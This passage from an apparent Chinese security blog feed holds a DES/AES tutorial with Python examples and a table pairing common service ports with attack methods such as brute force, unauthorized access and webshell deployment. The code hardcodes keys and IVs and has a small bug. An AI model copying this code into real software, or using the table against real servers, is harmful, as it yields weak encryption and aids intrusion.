srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425222311122"></p><p>当n个64位明文数据块都经过DES加密处理（这里采用上述四种工作方式中的ECB模式）后，所得到的n个64位密文数据块串在一起就是密文输出。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6doul8iej30ym0do0yh.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6doul8iej30ym0do0yh.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425222419777"></p><p>加密流程图</p><p>Round：每一轮都进行一次扩展置换、S盒压缩和P盒置换。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6dst3h54j312z0u0dqu.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6dst3h54j312z0u0dqu.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425222807887"></p><p>三个知识难点</p><ol><li>初始（终止）置换</li><li>扩展置换</li><li>S盒压缩</li></ol><h3 id="初始（终止）置换"><a href="#初始（终止）置换" class="headerlink" title="初始（终止）置换"></a>初始（终止）置换</h3><p>初始和终止置换都是按照一定的规则，将原来的64位二进制重新排序。</p><center>初始置换与终止置换表</center><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6egv0vzaj30v60fewof.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6egv0vzaj30v60fewof.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425225113206"></p><p>从初始置换表中可以看出，将输入的58位换到第1位，第50位换到第2位，以此类推</p><p>从终止置换表中可以看出，将输入的40位换到第1位，第08位换到第2位，以此类推</p><h4 id="举例例子来说明"><a href="#举例例子来说明" class="headerlink" title="举例例子来说明"></a>举例例子来说明</h4><p>根据上述初始置换与终止置换表，给定原始数据（一般是16位十六进制数，下图已将其转化为64位二进制数）</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6eozauqij30l804y0u4.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6eozauqij30l804y0u4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425225903387"></p><p>计算置换后的数据</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6f0jiukvj30q2064jtl.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6f0jiukvj30q2064jtl.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200425231009622"></p><p>终止置换的原理和初始置换是一样的，他们的排列是互逆的，即经过一次初始置换和终止置换，64位二进制数就还原了。</p><h3 id="扩展置换"><a href="#扩展置换" class="headerlink" title="扩展置换"></a>扩展置换</h3><p>经过初始置换的64位数据被分成左右32位数据，其中一边的32位进行扩展置换得到48位的数据。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6gj8gzn3j30o00fgtb8.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6gj8gzn3j30o00fgtb8.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200426000243820"></p><p>具体的扩展过程就是在某些位置进行添位操作。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6gkuk20pj315q064n5i.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6gkuk20pj315q064n5i.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200426000416940"></p><p>我们仍可以参照初始数据置换表类似的扩展置换表。</p><center>扩展置换表</center><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6gn5hikkj30zu0fm0we.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge6gn5hikkj30zu0fm0we.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200426000629416"></p><p>根据这32位二进制数据来展示扩展置换的过程.</p><p>将原始数据分成8组，接着将每个组从4位扩展成6位的组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1101 0001 0011 0100</span><br><span class="line">0010 0011 0011 1011</span><br></pre></td></tr></table></figure><p>根据扩展字段表</p><p>第一组的头添位是原始数据的第32位1，第一组的尾添位是原始数据的第05位0</p><p>第二组的头添位是原始数据的第04位1，第一组的尾添位是原始数据的第09位0</p><p>…依次类推</p><p>这样就完成从32位扩展到48位的扩展置换过程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">111010 100010 100110 101000</span><br><span class="line">000100 000110 100111 110111</span><br></pre></td></tr></table></figure><h3 id="S盒压缩处理"><a href="#S盒压缩处理" class="headerlink" title="S盒压缩处理"></a>S盒压缩处理</h3><p>经过扩展的48位明文和48位密钥进行异或运算后，再使用8个S盒压缩处理得到32位数据。 </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge70l4fkiaj30hk0hmn1k.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge70l4fkiaj30hk0hmn1k.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200426113630923"></p><p>实际上就是将48位输入等分成8块，每块6位输入压缩为4位输出。与前面置换表类似的，具体处理时是分别采用8张4行16列的表来进行替换从而达到压缩的目的。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge70ll6rrcj314k0awq8b.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge70ll6rrcj314k0awq8b.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200426113658219"></p><h4 id="举例例子来说明-1"><a href="#举例例子来说明-1" class="headerlink" title="举例例子来说明"></a>举例例子来说明</h4><p>输入原始数据，并将其分成8组，每组6位。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">111111 100101</span><br><span class="line">110011 001100</span><br><span class="line">011001 010111</span><br><span class="line">111011 011000</span><br></pre></td></tr></table></figure><center>第一组的压缩表</center><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge71cwxjkkj30sm074wk6.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge71cwxjkkj30sm074wk6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200426120313750"></p><p>我们以第一组为例来演示S盒压缩处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始数据：111111</span><br><span class="line">头尾数据（第0位和最后一位）：11 -&gt; 3  行数</span><br><span class="line">中间四位：1111 -&gt; 15 列数</span><br><span class="line">根据行数和列数即可在压缩表中找到对应的压缩数13</span><br><span class="line">再转化成二进制1101。</span><br></pre></td></tr></table></figure><p>在全部组完成S盒压缩，则是从48位转换到32为的S盒压缩处理过程。</p><h3 id="P盒置换"><a href="#P盒置换" class="headerlink" title="P盒置换"></a>P盒置换</h3><p>经过S盒压缩处理后，再经过P盒置换，就得到一轮运算中的最后输出了。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge71g5ev8gj30os0eotf4.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge71g5ev8gj30os0eotf4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200426120620592"></p><h2 id="DES-Python实现"><a href="#DES-Python实现" class="headerlink" title="DES Python实现"></a>DES Python实现</h2><p>若需要在Python中使用des加密，可以直接使用pyDes库加密，该库提供了CBC和ECB两种加密方式。（注：安装pyDes库 <code>pip install pyDes</code>）</p><p><code>pyDes.des(key, [mode], [IV], [pad], [padmode])</code></p><ul><li>Key 输入密钥    </li><li>mode ECB或者CBC    </li><li>IV 初始密钥8位（在使用CBC模式时）</li><li>pad/padmode 默认None/PAD_NORMAL</li></ul><p>需要注意的是在说明文档里写着Python3使用字节而不是字符串。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge727ne870j317o07kmy5.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge727ne870j317o07kmy5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200426123246292"></p><p>以下为本人使用的例子，采用CBC加密方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"></span><br><span class="line">Des_key = <span class="string">b&quot;ABCDEFGH&quot;</span> <span class="comment"># 密钥</span></span><br><span class="line">Des_IV = <span class="string">b&quot;\x33\x22\x81\x35\x38\xBC\xE7\x5A&quot;</span> <span class="comment">#自动IV向量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesEncrypt</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    k = pyDes.des(Des_key, pyDes.CBC, Des_IV, pad=<span class="literal">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(EncryptStr)</span><br><span class="line"></span><br><span class="line">DesEncrypt(<span class="string">b&quot;let do it&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Output: b&#39;Ub48xNwxZ&#x2F;B8ZpEvpO+Mwg&#x3D;&#x3D;&#39;</span><br></pre></td></tr></table></figure><h2 id="AES加密过程"><a href="#AES加密过程" class="headerlink" title="AES加密过程"></a>AES加密过程</h2><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge74b6g5elj31bw0gwwm2.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ge74b6g5elj31bw0gwwm2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200426134519614"></p><p>AES加密方式有五种：ECB, CBC, CTR, CFB, OFB</p><p>从安全性角度推荐CBC加密方法，本文介绍了CBC,ECB两种加密方法的python实现</p><p>python 在 <strong>Windows</strong>下使用AES时要安装的是pycryptodome 模块  pip install pycryptodome </p><p>python 在 <strong>Linux</strong>下使用AES时要安装的是pycrypto模块  pip install pycrypto </p><p>CBC加密需要一个十六位的key(密钥)和一个十六位iv(偏移量)</p><p>ECB加密不需要iv</p><h3 id="AES-CBC-Python实现"><a href="#AES-CBC-Python实现" class="headerlink" title="AES-CBC Python实现"></a>AES-CBC Python实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果text不足16位的倍数就用空格补足为16位</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_to_16</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>:</span><br><span class="line">        add = <span class="number">16</span> - (<span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        add = <span class="number">0</span></span><br><span class="line">    text = text + (<span class="string">&#x27;\0&#x27;</span> * add)</span><br><span class="line">    <span class="keyword">return</span> text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text</span>):</span></span><br><span class="line">    key = <span class="string">&#x27;9999999999999999&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27;qqqqqqqqqqqqqqqq&#x27;</span></span><br><span class="line">    text = add_to_16(text)</span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    cipher_text = cryptos.encrypt(text)</span><br><span class="line">    <span class="comment"># 因为AES加密后的字符串不一定是ascii字符集的，输出保存可能存在问题，所以这里转为16进制字符串</span></span><br><span class="line">    <span class="keyword">return</span> b2a_hex(cipher_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密后，去掉补足的空格用strip() 去掉</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">text</span>):</span></span><br><span class="line">    key = <span class="string">&#x27;9999999999999999&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    iv = <span class="string">b&#x27;qqqqqqqqqqqqqqqq&#x27;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    plain_text = cryptos.decrypt(a2b_hex(text))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.decode(plain_text).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e = encrypt(<span class="string">&quot;hello world&quot;</span>)  <span class="comment"># 加密</span></span><br><span class="line">    d = decrypt(e)  <span class="comment"># 解密</span></span><br><span class="line">    print(<span class="string">&quot;加密:&quot;</span>, e)</span><br><span class="line">    print(<span class="string">&quot;解密:&quot;</span>, d)</span><br></pre></td></tr></table></figure><h3 id="AES-ECB-Python实现"><a href="#AES-ECB-Python实现" class="headerlink" title="AES-ECB Python实现"></a>AES-ECB Python实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ECB没有偏移量</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_to_16</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>:</span><br><span class="line">        add = <span class="number">16</span> - (<span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        add = <span class="number">0</span></span><br><span class="line">    text = text + (<span class="string">&#x27;\0&#x27;</span> * add)</span><br><span class="line">    <span class="keyword">return</span> text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text</span>):</span></span><br><span class="line">    key = <span class="string">&#x27;9999999999999999&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    mode = AES.MODE_ECB</span><br><span class="line">    text = add_to_16(text)</span><br><span class="line">    cryptos = AES.new(key, mode)</span><br><span class="line"></span><br><span class="line">    cipher_text = cryptos.encrypt(text)</span><br><span class="line">    <span class="keyword">return</span> b2a_hex(cipher_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密后，去掉补足的空格用strip() 去掉</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">text</span>):</span></span><br><span class="line">    key = <span class="string">&#x27;9999999999999999&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    mode = AES.MODE_ECB</span><br><span class="line">    cryptor = AES.new(key, mode)</span><br><span class="line">    plain_text = cryptor.decrypt(a2b_hex(text))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.decode(plain_text).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e = encrypt(<span class="string">&quot;hello world&quot;</span>)  <span class="comment"># 加密</span></span><br><span class="line">    d = decrypt(e)  <span class="comment"># 解密</span></span><br><span class="line">    print(<span class="string">&quot;加密:&quot;</span>, e)</span><br><span class="line">    print(<span class="string">&quot;解密:&quot;</span>, d)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常见端口及攻防手段</title>
      <link href="2020/04/22/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%94%BB%E9%98%B2%E6%89%8B%E6%AE%B5/"/>
      <url>2020/04/22/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%94%BB%E9%98%B2%E6%89%8B%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<p>本文学习常见端口以及对应的服务器的攻防手段。</p><a id="more"></a><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击技巧</th></tr></thead><tbody><tr><td>21/22/69</td><td>ftp/tftp文件传输协议</td><td>爆破\嗅探\溢出\后门</td></tr><tr><td>22</td><td>ssh：远程连接</td><td>爆破OpenSSH；28个退格</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破\嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS：域名系统</td><td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td>67/68</td><td>dhcp</td><td>劫持\欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破</td></tr><tr><td>139</td><td>samba</td><td>爆破\未授权访问\远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>爆破</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ldap</td><td>注入攻击\未授权访问</td></tr><tr><td>512/513/514</td><td>linux r</td><td>直接使用rlogin</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破：进行内网渗透</td></tr><tr><td>1352</td><td>lotus</td><td>爆破：弱口令\信息泄漏：源代码</td></tr><tr><td>1433</td><td>mssql</td><td>爆破：使用系统用户登录\注入攻击</td></tr><tr><td>1521</td><td>oracle</td><td>爆破：TNS\注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破\拒绝服务\注入</td></tr><tr><td>3389</td><td>rdp</td><td>爆破\Shift后门</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破：控制台弱口令\认证绕过</td></tr><tr><td>5000</td><td>sybase/DB2</td><td>爆破\注入</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务\代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破：弱口令\认证绕过</td></tr><tr><td>6379</td><td>redis</td><td>未授权访问\爆破：弱口令</td></tr><tr><td>7001</td><td>weblogic</td><td>ava反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td>80/443/8080</td><td>web</td><td>常见web攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td>8069</td><td>zabbix</td><td>远程命令执行</td></tr><tr><td>9090</td><td>websphere控制台</td><td>爆破：控制台弱口令\Java反序列</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破\未授权访问</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python数据库编程</title>
      <link href="2020/04/13/Python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/"/>
      <url>2020/04/13/Python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>本文讲解Python数据库编程。</p><a id="more"></a><h2 id="Python-DB-API"><a href="#Python-DB-API" class="headerlink" title="Python DB API"></a>Python DB API</h2><p>在没有Python DB API之前</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdshl6dgkjj31au0ku7bd.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gdshl6dgkjj31au0ku7bd.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200413220115336"></p><p>在有了Python DB API之后</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdshot0zmaj31ao0k2af6.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gdshot0zmaj31ao0k2af6.jpg" 